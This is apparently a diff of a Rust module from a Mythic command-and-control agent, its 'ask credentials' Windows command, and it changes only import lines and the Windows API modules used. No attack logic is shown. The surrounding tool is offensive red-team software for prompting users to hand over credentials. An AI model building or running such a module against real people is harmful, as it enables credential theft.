@@ -1,9 +1,7 @@
-use std::ffi::{OsStr, OsString};
-use std::os::windows::ffi::{OsStrExt, OsStringExt};
+use std::ffi::OsStr;
+use std::os::windows::ffi::OsStrExt;
 use std::ptr;
-use std::thread;
-use std::time::Duration;
-use serde::{Deserialize, Serialize};
+use serde::Serialize;
 use crate::{AgentTask, mythic_success, mythic_error};
 use crate::agent::AskCredsArgs;
 
@@ -20,15 +18,13 @@ use winapi::um::handleapi::*;
 #[cfg(target_os = "windows")]
 use winapi::um::synchapi::*;
 #[cfg(target_os = "windows")]
-use winapi::um::memoryapi::*;
-#[cfg(target_os = "windows")]
 use winapi::um::errhandlingapi::*;
 #[cfg(target_os = "windows")]
 use winapi::um::combaseapi::CoTaskMemFree;
 #[cfg(target_os = "windows")]
 use winapi::shared::windef::HWND;
 #[cfg(target_os = "windows")]
-use winapi::shared::minwindef::{FALSE, TRUE, BOOL, ULONG, LPARAM, WPARAM, DWORD, LPVOID};
+use winapi::shared::minwindef::{FALSE, TRUE, BOOL, ULONG, LPARAM, WPARAM, DWORD};
 #[cfg(target_os = "windows")]
 use winapi::shared::winerror::{
     ERROR_SUCCESS, ERROR_CANCELLED, ERROR_INSUFFICIENT_BUFFER, WAIT_TIMEOUT,
@@ -37,8 +33,10 @@ use winapi::shared::winerror::{
 use winapi::um::winnt::{HEAP_ZERO_MEMORY, PROCESS_QUERY_INFORMATION};
 #[cfg(target_os = "windows")]
 use winapi::um::winbase::{
-    QueryFullProcessImageNameW, GetUserNameW, GetProcessHeap, HeapAlloc, HeapFree, WAIT_OBJECT_0,
+    QueryFullProcessImageNameW, GetUserNameW,
 };
+#[cfg(target_os = "windows")]
+use winapi::um::heapapi::{GetProcessHeap, HeapAlloc, HeapFree};
 
 #[cfg(target_os = "windows")]
 const TIMEOUT: u32 = 60;
